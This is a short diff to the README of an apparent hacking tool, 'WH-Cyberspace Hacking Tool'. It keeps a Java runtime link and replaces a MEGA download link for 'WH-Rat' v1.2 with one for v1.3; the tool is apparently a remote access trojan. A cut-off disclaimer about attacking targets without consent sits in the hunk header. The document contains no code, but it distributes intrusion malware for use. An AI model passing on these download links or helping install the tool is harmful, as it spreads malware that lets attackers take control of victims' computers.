@@ -11,7 +11,7 @@ Usage of WH-Cyberspace Hacking Tool for attacking targets without prior mutual  
 ☆ java >  jre x86 [Here]( https://www.oracle.com/java/technologies/javase-jre8-downloads.html?fbclid=IwAR22d1RWiauPFfB1Ei2B-ryUT4tBJGpHQLbimDn07nre2rAkyjHoaORZ4x8 " JAVA JRE")
 
 
-☆ WH-Rat x86 v1.2 / 32 bit > mega drive :[Here]( https://mega.nz/file/MVs33Y4J#1Ao4jSSre9gzACWEOp8m3mmcEaz7R9dQ_nz19wBkxPA "WH-Rat x86 v1.2  / 32 bit")
+☆ WH-Rat x86 v1.3 / 32 bit > mega drive :[Here]( https://mega.nz/file/RR1XjSTB#uYst1_xdeBmTlveHfmqoNygDU557Z1J_t5oFPjcFdJc "WH-Rat x86 v1.3  / 32 bit")
 
  or
 
